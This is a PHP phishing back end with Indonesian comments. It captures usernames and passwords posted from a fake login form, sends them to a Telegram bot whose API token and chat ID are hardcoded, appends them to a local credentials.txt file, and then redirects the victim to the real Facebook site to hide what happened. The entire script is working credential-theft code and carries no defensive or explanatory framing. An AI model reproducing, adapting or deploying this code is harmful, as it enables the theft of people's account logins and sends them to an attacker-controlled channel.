<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Telegram Bot Token dan Chat ID
$botToken = "8176476072:AAGUZ1BLQHWKS9nKMN1EiLoVqgyah6wQA-I";
$chatID = "7547566464";

// Pesan yang akan dikirim ke Telegram
$message = "Username: " . $username . "\nPassword: " . $password;

// URL untuk mengirim pesan ke Telegram Bot API
$telegramURL = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatID . "&text=" . urlencode($message);

// Kirim pesan ke Telegram
file_get_contents($telegramURL);

// Simpan kredensial ke file (opsional)
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
fclose($file);

// Redirect ke halaman Facebook asli
header("Location: https://www.facebook.com");
exit();
?>
